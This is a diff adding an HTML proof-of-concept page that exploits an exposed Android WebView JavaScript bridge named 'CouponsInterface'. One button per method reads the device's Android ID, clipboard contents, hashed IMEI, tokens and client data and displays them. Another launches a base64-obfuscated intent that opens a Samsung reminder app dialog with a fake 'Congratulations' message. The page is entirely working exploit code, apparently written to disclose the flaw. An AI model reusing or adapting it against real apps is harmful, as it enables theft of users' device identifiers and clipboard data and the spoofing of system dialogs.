@@ -1,0 +1,100 @@
+<html>
+<head>
+<script type="text/javascript">
+	function getAndroidId() {
+		var androidId = CouponsInterface.getAndroidId();
+		alert("CouponsInterface.getAndroidId() can be called: " + androidId);
+		console.log("getAndroidId(): " + androidId);
+		return androidId;
+	}
+	
+	function getClientInfo() {
+	    var clientInfo = CouponsInterface.getClientInfo();
+		alert("CouponsInterface.getClientInfo(): " + clientInfo);
+	}
+	
+	function getClipBoardString() {
+		var str = CouponsInterface.getClipBoardString();
+		alert("CouponsInterface.getClipBoardString(): " + str);
+	}
+	
+	function getCouponsData() {
+		console.log("getCouponsData() method");
+		var str = CouponsInterface.getCouponsData();
+		alert("getCouponsData(): " + str);
+	}
+	
+	function getReverseId() {
+		console.log("getReverseId() method");
+		var id = CouponsInterface.getReverseId();
+		alert("getReverseId(): " + id);
+	}
+
+    function getSAID() {
+		console.log("getSAID() method");
+		var id = CouponsInterface.getSAID();
+		alert("getSAID(): " + id);
+	}
+
+	function showSha256DeviceIMEI(imei) {
+	    console.log("showSha256DeviceIMEI() method");
+	    alert("showSha256DeviceIMEI(): " + imei);
+	}
+
+	function getSha256DeviceIMEI() {
+	    console.log("getSha256DeviceIMEI() method");
+	    CouponsInterface.getSha256DeviceIMEI("showSha256DeviceIMEI");
+	}
+
+
+    function showToken(token) {
+        console.log("showToken() method");
+        alert("showToken(): " + token);
+    }
+
+	function getToken() {
+	    var cpName = "fanli";
+	    var callback = "";
+	    CouponsInterface.getToken(cpName, callback);
+	}
+
+	function isShoppingAssistantOn() {
+	    var isOn = CouponsInterface.isShoppingAssistantOn();
+	    alert("isShoppingAssistantOn(): " + isOn);
+	    console.log("isShoppingAssistantOn(): " + isOn);
+	}
+
+	function openCouponPage() {
+	    var c = "tb";
+        var title = "test";
+		var a = "aW50ZW50OiNJbnRlbnQ7Y29tcG9uZW50PWNvbS5zYW1zdW5nLmFuZHJvaWQuYXBwLnNyZW1pbmRlci8uY29tbW9uLkNvbW1vbkRpYWxvZ0FjdGl2aXR5O1MuZGlhbG9nX25lZ2F0aXZlX2J1dHRvbj1Db250aW51ZTtTLnBvc2l0aXZlX2FjdGlvbj07Uy5uZWdhdGl2ZV9hY3Rpb249O1MuZGlhbG9nX21lc3NhZ2U9Q29uZ3JhdHVsYXRpb25zJTIwdG8lMjB5b3UhO1MuZGlhbG9nX3RpdGxlPUhlbGxvO1MuZGlhbG9nX2NhbGxlcj07Uy5kaWFsb2dfcG9zaXRpdmVfYnV0dG9uPUNhbmNlbDtlbmQ=";
+        var b = window.atob(a)
+	    CouponsInterface.openCouponPage(c, b, title);
+	}
+
+</script>
+<style type="text/css">
+button {
+	white-space: normal;
+}
+input[type="button"] {
+	white-space: normal;
+}
+</style>
+</head>
+<body>
+	<h3>PoC</h3>
+	<p>
+		<button onclick="getAndroidId()">getAndroidId()</button>		<br /><br />
+        <button onclick="getClientInfo()">getClientInfo()</button>		<br /><br />
+        <button onclick="getClipBoardString()">getClipBoardString()</button>		<br /><br />
+        <button onclick="getCouponsData()">getCouponsData()</button>		<br /><br />
+        <button onclick="getReverseId()">getReverseId()</button>		<br /><br />
+        <button onclick="getSha256DeviceIMEI()">getSha256DeviceIMEI()</button>		<br /><br />
+        <button onclick="getToken()">getToken()</button>		<br /><br />
+        <button onclick="isShoppingAssistantOn()">isShoppingAssistantOn()</button>		<br /><br />
+        <button onclick="openCouponPage()">openCouponPage()</button>		<br /><br />
+	</p>
+</body>
+</html>
+
